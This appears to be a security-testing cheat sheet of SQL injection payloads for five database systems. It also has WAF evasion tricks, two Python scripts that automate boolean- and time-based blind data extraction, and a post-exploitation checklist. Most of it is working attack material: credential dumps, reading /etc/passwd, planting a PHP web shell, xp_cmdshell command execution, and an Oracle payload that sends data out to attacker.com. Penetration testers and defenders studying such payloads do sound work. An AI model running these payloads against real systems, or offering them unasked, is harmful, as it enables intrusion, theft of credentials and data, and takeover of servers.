# SQL Injection Manual Testing Tools

Comprehensive collection of manual SQL injection testing techniques and payloads for various database systems.

## Basic SQL Injection Detection

### Error-Based Detection
```sql
-- Single quote test
'

-- Double quote test
"

-- Numeric test
1'
1"
1`

-- Comment injection
' --
' #
' /*
'%00

-- Logic tests
' OR '1'='1
' OR 1=1--
' AND 1=1--
' AND 1=2--
```

### Union-Based Detection
```sql
-- Column count detection
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...

-- Union injection testing
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Data type testing
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

## Database-Specific Payloads

### MySQL Payloads
```sql
-- Version detection
' UNION SELECT @@version--
' AND (SELECT @@version)=@@version--

-- Database enumeration
' UNION SELECT schema_name FROM information_schema.schemata--
' UNION SELECT database()--

-- Table enumeration
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- Column enumeration
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Data extraction
' UNION SELECT username,password FROM users--
' UNION SELECT CONCAT(username,':',password) FROM users--

-- File operations
' UNION SELECT LOAD_FILE('/etc/passwd')--
' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

-- Time-based blind
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND (SELECT SLEEP(5) FROM dual WHERE database()='target')--

-- Boolean-based blind
' AND (SELECT COUNT(*) FROM users)>0--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>97--

-- Error-based
' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT database())))--
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### PostgreSQL Payloads
```sql
-- Version detection
' UNION SELECT version()--

-- Database enumeration
' UNION SELECT datname FROM pg_database--
' UNION SELECT current_database()--

-- Table enumeration
' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--

-- Column enumeration
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Data extraction
' UNION SELECT username,password FROM users--

-- File operations
' UNION SELECT pg_read_file('/etc/passwd')--

-- Time-based blind
' AND pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- Boolean-based blind
' AND (SELECT COUNT(*) FROM users)>0--
' AND ASCII(SUBSTRING((SELECT current_database()),1,1))>97--

-- Error-based
' AND (SELECT CAST((SELECT current_database()) AS int))--
```

### SQL Server Payloads
```sql
-- Version detection
' UNION SELECT @@version--

-- Database enumeration
' UNION SELECT name FROM sys.databases--
' UNION SELECT db_name()--

-- Table enumeration
' UNION SELECT name FROM sys.tables--

-- Column enumeration
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Data extraction
' UNION SELECT username,password FROM users--

-- Command execution
'; EXEC xp_cmdshell('whoami')--
'; EXEC master..xp_cmdshell 'dir c:\'--

-- Time-based blind
'; WAITFOR DELAY '00:00:05'--
' AND (SELECT CASE WHEN (1=1) THEN 'A' ELSE (SELECT 'A' UNION SELECT 'B') END)='A'; WAITFOR DELAY '00:00:05'--

-- Boolean-based blind
' AND (SELECT COUNT(*) FROM users)>0--

-- Error-based
' AND (SELECT CAST((SELECT db_name()) AS int))--
```

### Oracle Payloads
```sql
-- Version detection
' UNION SELECT banner FROM v$version WHERE ROWNUM=1--

-- Database enumeration
' UNION SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual--

-- Table enumeration
' UNION SELECT table_name FROM all_tables--

-- Column enumeration
' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--

-- Data extraction
' UNION SELECT username,password FROM users--

-- Time-based blind
' AND (SELECT COUNT(*) FROM all_users WHERE ROWNUM<=1 AND DBMS_LOCK.SLEEP(5) IS NULL)>0--

-- Boolean-based blind
' AND (SELECT COUNT(*) FROM users)>0--

-- Error-based
' AND (SELECT CAST((SELECT user FROM dual) AS number) FROM dual)=1--

-- Out-of-band
' AND (SELECT EXTRACTVALUE(XMLType('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/'||(SELECT user FROM dual)||'"> %remote;]>'),'/l') FROM dual)--
```

### SQLite Payloads
```sql
-- Version detection
' UNION SELECT sqlite_version()--

-- Table enumeration
' UNION SELECT name FROM sqlite_master WHERE type='table'--

-- Column enumeration
' UNION SELECT sql FROM sqlite_master WHERE name='users'--

-- Data extraction
' UNION SELECT username,password FROM users--

-- File operations (limited)
' UNION SELECT load_extension('malicious.so')--
```

## Advanced Injection Techniques

### Second-Order SQL Injection
```sql
-- Registration phase
INSERT INTO users (username, email) VALUES ('admin''OR 1=1--', 'test@email.com');

-- Exploitation phase (when data is used in query)
SELECT * FROM posts WHERE author='admin'OR 1=1--';
```

### Blind SQL Injection Automation
```python
#!/usr/bin/env python3
import requests
import string

def extract_data_boolean(url, injection_point, query, true_condition):
    """Extract data using boolean-based blind SQL injection"""
    result = ""
    position = 1
    
    while True:
        found_char = None
        for char in string.printable:
            payload = f"' AND ASCII(SUBSTRING(({query}),{position},1))={ord(char)}--"
            test_url = url.replace(injection_point, payload)
            
            response = requests.get(test_url)
            if true_condition in response.text:
                found_char = char
                break
        
        if found_char:
            result += found_char
            print(f"Position {position}: {found_char}")
            position += 1
        else:
            break
    
    return result

# Usage
url = "http://target.com/page?id=INJECT"
database = extract_data_boolean(url, "INJECT", "SELECT database()", "Welcome")
print(f"Database: {database}")
```

### WAF Bypass Techniques
```sql
-- Comment variations
/**/
--+
-- -
#
;%00

-- Space alternatives
/**/ (MySQL)
%20
%09 (tab)
%0a (newline)
%0d (carriage return)
+ (plus)

-- Quote alternatives
' (single quote)
" (double quote)
` (backtick)
%27 (URL encoded single quote)
%22 (URL encoded double quote)

-- Keyword obfuscation
UNION -> UNION/**/SELECT
SELECT -> /*!50000SELECT*/
WHERE -> WHER/**/E

-- Case variations
union -> UNION, UnIoN, uNiOn
select -> SELECT, SeLeCt, sElEcT

-- Encoding techniques
Hex encoding: CHAR(0x41,0x42,0x43) -> 'ABC'
ASCII encoding: CHAR(65,66,67) -> 'ABC'
Unicode encoding: N'%u0041%u0042%u0043' -> 'ABC'

-- Function alternatives
ASCII() -> ORD()
SUBSTRING() -> SUBSTR(), MID(), LEFT(), RIGHT()
LENGTH() -> LEN(), CHAR_LENGTH()
```

### Time-Based Blind Extraction
```python
#!/usr/bin/env python3
import requests
import time
import string

def extract_data_time(url, injection_point, query, delay=5):
    """Extract data using time-based blind SQL injection"""
    result = ""
    position = 1
    
    while True:
        found_char = None
        for char in string.printable:
            payload = f"' AND IF(ASCII(SUBSTRING(({query}),{position},1))={ord(char)},SLEEP({delay}),0)--"
            test_url = url.replace(injection_point, payload)
            
            start_time = time.time()
            try:
                response = requests.get(test_url, timeout=delay+2)
                elapsed_time = time.time() - start_time
                
                if elapsed_time >= delay:
                    found_char = char
                    break
            except requests.Timeout:
                found_char = char
                break
        
        if found_char:
            result += found_char
            print(f"Position {position}: {found_char}")
            position += 1
        else:
            break
    
    return result

# Usage
url = "http://target.com/page?id=INJECT"
username = extract_data_time(url, "INJECT", "SELECT username FROM users LIMIT 1")
print(f"Username: {username}")
```

## Testing Methodology

### 1. Detection Phase
1. **Input validation testing**: Test all parameters with basic payloads
2. **Error message analysis**: Look for database-specific error messages
3. **Response analysis**: Compare responses for different payloads
4. **Time analysis**: Test for time-based responses

### 2. Exploitation Phase
1. **Determine injection type**: Union, boolean, time-based, error-based
2. **Identify database type**: Use version strings and syntax differences
3. **Map database structure**: Extract schema information
4. **Extract sensitive data**: Target high-value tables and columns

### 3. Post-Exploitation
1. **Privilege escalation**: Test for administrative functions
2. **File system access**: Attempt file read/write operations
3. **Command execution**: Test for OS command execution capabilities
4. **Network access**: Explore network connectivity and pivoting

## Manual Testing Checklist

### Parameters to Test
- [ ] URL parameters (GET)
- [ ] Form data (POST)
- [ ] HTTP headers (User-Agent, X-Forwarded-For, etc.)
- [ ] Cookies
- [ ] JSON/XML data
- [ ] File upload parameters

### Injection Points
- [ ] String values
- [ ] Numeric values
- [ ] ORDER BY clauses
- [ ] WHERE conditions
- [ ] HAVING clauses
- [ ] INSERT statements
- [ ] UPDATE statements
- [ ] DELETE statements

### Database Functions to Test
- [ ] Authentication bypass
- [ ] Data extraction
- [ ] File operations
- [ ] Command execution
- [ ] Network functions
- [ ] Administrative functions

Essential manual testing techniques for comprehensive SQL injection vulnerability assessment across all major database platforms.
